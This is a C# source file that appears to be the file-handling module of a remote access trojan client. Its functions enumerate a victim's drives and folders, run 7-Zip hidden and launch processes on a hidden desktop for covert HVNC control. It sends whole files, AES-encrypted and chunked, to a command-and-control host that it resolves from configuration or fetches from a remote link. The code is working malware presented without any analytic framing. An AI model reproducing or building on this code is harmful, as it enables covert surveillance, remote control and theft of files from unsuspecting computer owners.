using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using MessagePack;

namespace Client.HandlePacket
{
    internal class HandleFile
    {
        public static List<Copy> Copies = new List<Copy>();
        public static string ZipPath = Path.Combine(Path.GetTempPath(), "7-Zip\\7z.exe");
        private static string m_desktopName;

        public class Copy
        {
            public string HWID = null;
            public string FileCopy = null;
            public string PathCopy = null;
        }

        public static void GetDrivers()
        {
            try
            {
                var allDrives = DriveInfo.GetDrives();

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "getDrivers";
                var sbDriver = new StringBuilder();
                foreach (var d in allDrives)
                    if (d.IsReady)
                        sbDriver.Append(d.Name + "-=>" + d.DriveType + "-=>");
                msgpack.ForcePathObject("Driver").AsString = sbDriver.ToString();
                Program.TCP_Socket.Send(msgpack.Encode2Bytes());
            }
            catch (Exception ex)
            {
                Error(ex.Message);
            }
        }

        public static void GetPath(string path)
        {
            try
            {
                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "getPath";
                var sbFolder = new StringBuilder();
                var sbFile = new StringBuilder();

                if (path == "DESKTOP") path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

                if (path == "APPDATA")
                    path = Path.Combine(Environment.GetEnvironmentVariable("USERPROFILE"), "AppData");

                if (path == "USER") path = Environment.GetEnvironmentVariable("USERPROFILE");

                if (path == "SYSTEM32") path = Environment.GetFolderPath(Environment.SpecialFolder.System);

                if (path == "TEMP") path = Path.GetTempPath();

                foreach (var folder in Directory.GetDirectories(path))
                    sbFolder.Append(Path.GetFileName(folder) + "-=>" + Path.GetFullPath(folder) + "-=>" +
                                    new FileInfo(folder).LastWriteTime + "-=>");
                foreach (var file in Directory.GetFiles(path))
                    using (var ms = new MemoryStream())
                    {
                        GetIcon(file.ToLower()).Save(ms, ImageFormat.Png);
                        sbFile.Append(Path.GetFileName(file) + "-=>" + Path.GetFullPath(file) + "-=>" +
                                      Convert.ToBase64String(ms.ToArray()) + "-=>" + new FileInfo(file).Length + "-=>" +
                                      new FileInfo(file).LastWriteTime + "-=>" + GetFileType(file) + "-=>");
                    }

                msgpack.ForcePathObject("Folder").AsString = sbFolder.ToString();
                msgpack.ForcePathObject("File").AsString = sbFile.ToString();
                msgpack.ForcePathObject("CurrentPath").AsString = path;
                Program.TCP_Socket.Send(msgpack.Encode2Bytes());
            }
            catch (Exception ex)
            {
                Error(ex.Message);
            }
        }
        public static void CopyDirectory(string sourceDirPath, string saveDirPath)
        {
            try
            {
                if (!Directory.Exists(saveDirPath))
                {
                    Directory.CreateDirectory(saveDirPath);
                }
                string[] files = Directory.GetFiles(sourceDirPath);
                foreach (string file in files)
                {
                    try
                    {
                        string pFilePath = saveDirPath + "\\" + Path.GetFileName(file);
                        if (File.Exists(pFilePath))
                            continue;
                        File.Copy(file, pFilePath, true);
                    }
                    catch { }
                }

                string[] dirs = Directory.GetDirectories(sourceDirPath);
                foreach (string dir in dirs)
                {
                    CopyDirectory(dir, saveDirPath + "\\" + Path.GetFileName(dir));
                }
            }
            catch (Exception ex)
            {
            }
        }

        private static string GetFileType(string Path)
        {
            try
            {
                var shinfo = new Native.SHFILEINFO();

                var flag = Native.SHGFI.SHGFI_ATTRIBUTES | Native.SHGFI.SHGFI_TYPENAME
                    ;
                Native.SHGetFileInfo(Path, 0, out shinfo, (uint) Marshal.SizeOf(typeof(Native.SHFILEINFO)), flag);
                return shinfo.szTypeName;
            }
            catch (Exception e)
            {
                return "ERROR: " + e.Message;
            }
        }

        private static Bitmap GetIcon(string file)
        {
            try
            {
                if (file.EndsWith("jpg") || file.EndsWith("jpeg") || file.EndsWith("gif") || file.EndsWith("png") ||
                    file.EndsWith("bmp"))
                    using (var myBitmap = new Bitmap(file))
                    {
                        return new Bitmap(myBitmap.GetThumbnailImage(48, 48,
                            () => false, IntPtr.Zero));
                    }

                using (var icon = Icon.ExtractAssociatedIcon(file))
                {
                    return icon.ToBitmap();
                }
            }
            catch
            {
                return new Bitmap(48, 48);
            }
        }

        public static void ZipCommandLine(string args, bool isZip, string location)
        {
            if (isZip)
                Process.Start(new ProcessStartInfo
                {
                    FileName = "\"" + ZipPath + "\"",
                    Arguments = $"a -r \"{location}.zip\" {args} -y",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    ErrorDialog = false
                });
            else
                Process.Start(new ProcessStartInfo
                {
                    FileName = "\"" + ZipPath + "\"",
                    Arguments =
                        $"x \"{args}\" -o\"{args.Replace(Path.GetFileName(args), "_" + Path.GetFileNameWithoutExtension(args))}\" -y",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    ErrorDialog = false
                });
        }

        public static void Error(string ex)
        {
            var msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "fileError";
            msgpack.ForcePathObject("Message").AsString = ex;
            Program.TCP_Socket.Send(msgpack.Encode2Bytes());
        }

        public static bool CheckForSevenZip()
        {
            try
            {
                if (File.Exists(ZipPath)) return true;

                return false;
            }
            catch
            {
                return false;
            }
        }


        public static void ExecuteNewDesktop(string path)
        {
            if (!HandleHVNC.inited)
            {
                HandleHVNC.HandleHVNCInit();
            }

            Native.SetThreadDesktop(HandleHVNC.hNewDesktop); 
            var si = new Native.STARTUPINFO();
            si.cb = Marshal.SizeOf(si);
            si.lpDesktop = Program.HWID;

            var pi = new Native.PROCESS_INFORMATION();

            var result = Native.CreateProcess(null, path, IntPtr.Zero, IntPtr.Zero, true,
                Native.NORMAL_PRIORITY_CLASS,
                IntPtr.Zero, null, ref si, ref pi);
            Native.SetThreadDesktop(HandleHVNC.hOldDesktop);
        }

        public static bool CreateProcess(string path)
        {
            var si = new Native.STARTUPINFO();
            si.cb = Marshal.SizeOf(si);

            var pi = new Native.PROCESS_INFORMATION();

            var result = Native.CreateProcess(null, path, IntPtr.Zero, IntPtr.Zero, true,
                Native.NORMAL_PRIORITY_CLASS,
                IntPtr.Zero, null, ref si, ref pi);

            return result;
        }

        public void DownnloadFile(string file, string dwid )
        {
            try
            {
                Socket Client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                {
                    ReceiveBufferSize = 50 * 1024,
                    SendBufferSize = 50 * 1024,
                };
                if (string.IsNullOrEmpty(Program.Link))
                {
                    if (TCPSocket.IsValidDomainName(Program.Host))
                    {
                        IPAddress[] addresslist = Dns.GetHostAddresses(Program.Host);

                        foreach (IPAddress theaddress in addresslist)
                        {
                            try
                            {
                                Client.Connect(theaddress, Program.Port);
                                if (Client.Connected) break;
                            }
                            catch { }
                        }
                    }
                    else
                    {
                        Client.Connect(Program.Host, Program.Port);
                    }
                }
                else
                {
                    using (WebClient wc = new WebClient())
                    {
                        NetworkCredential networkCredential = new NetworkCredential("", "");
                        wc.Credentials = networkCredential;
                        string resp = wc.DownloadString(Program.Link);
                        string[] spl = resp.Split(new[] { ":" }, StringSplitOptions.None);
                        Client.Connect(spl[0], Convert.ToInt32(spl[new Random().Next(1, spl.Length)]));
                    }
                }
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "fileDownload";
                msgpack.ForcePathObject("HWID").AsString = Program.HWID;
                msgpack.ForcePathObject("DWID").AsString = dwid;
                msgpack.ForcePathObject("Name").AsString = Path.GetFileName(file);
                msgpack.ForcePathObject("File").SetAsBytes(File.ReadAllBytes(file));
                ChunkSend(Helper.Helper.Aes.Encrypt(msgpack.Encode2Bytes()), Client);

                Client.Shutdown(SocketShutdown.Both);
                Client.Close();
            }
            catch
            {
                return;
            }
        }

        private void ChunkSend(byte[] msg, Socket client)
        {
            try
            {
                byte[] buffersize = BitConverter.GetBytes(msg.Length);
                client.Poll(-1, SelectMode.SelectWrite);
                client.Send(buffersize);

                int chunkSize = 50 * 1024;
                byte[] chunk = new byte[chunkSize];
                int SendPackage;
                using (MemoryStream buffereReader = new MemoryStream(msg))
                {
                    BinaryReader binaryReader = new BinaryReader(buffereReader);
                    int bytesToRead = (int)buffereReader.Length;
                    do
                    {
                        chunk = binaryReader.ReadBytes(chunkSize);
                        bytesToRead -= chunkSize;
                        SendPackage = client.Send(chunk);
                    } while (bytesToRead > 0);

                    binaryReader.Close();
                }
            }
            catch
            {
                return;
            }
        }
    }
}